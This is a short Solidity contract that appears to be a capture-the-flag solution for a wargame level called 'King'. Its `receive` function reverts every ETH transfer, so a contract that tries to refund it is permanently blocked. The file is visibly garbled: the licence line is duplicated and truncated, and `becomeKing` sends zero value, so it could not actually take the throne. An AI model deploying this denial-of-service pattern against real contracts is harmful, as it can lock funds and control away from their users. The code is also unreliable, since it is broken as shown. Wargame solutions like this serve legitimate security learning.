// SPDX-Licen// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IKing} from "./IKing.sol";

// solhint-disable no-empty-blocks, avoid-low-level-calls
contract KingSolution {
  address private kingContract;
  error ETHNotAccepted(address from, uint256 amount);

  constructor() {}

  function becomeKing(IKing kingContract_) external returns (bool) {
    (bool result, ) = address(kingContract_).call{value: 0}("");
    return result;
  }

  receive() external payable {
    revert ETHNotAccepted(msg.sender, msg.value);
  }
}
